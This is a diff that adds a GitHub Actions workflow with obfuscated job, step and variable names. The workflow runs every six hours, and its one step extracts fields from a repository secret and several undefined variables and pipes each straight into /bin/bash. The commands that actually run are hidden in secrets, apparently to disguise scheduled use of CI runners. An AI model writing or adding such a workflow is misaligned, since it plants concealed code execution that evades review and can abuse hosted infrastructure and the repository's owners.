@@ -1,0 +1,24 @@
+name: xianghuaguo3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianghuaguo3451
+        env:
+          lwzzm92: ${{ secrets.lwzzm92 }}
+        run: |
+          echo $lwzzm92 | jq -r .xzad46984 | /bin/bash
+          echo $ayrk780 | jq -r .i4573 | /bin/bash
+          echo $j75021 | jq -r .m7275 | /bin/bash
+          echo $weobt917 | jq -r .cnlz8439 | /bin/bash
+          echo $k0 | jq -r .gsfq2137 | /bin/bash
+          echo $daf44056 | jq -r .daxjw1 | /bin/bash
+          echo $lkczc84307 | jq -r .jf462 | /bin/bash
+          echo $ho37 | jq -r .jgkpv46956 | /bin/bash
+
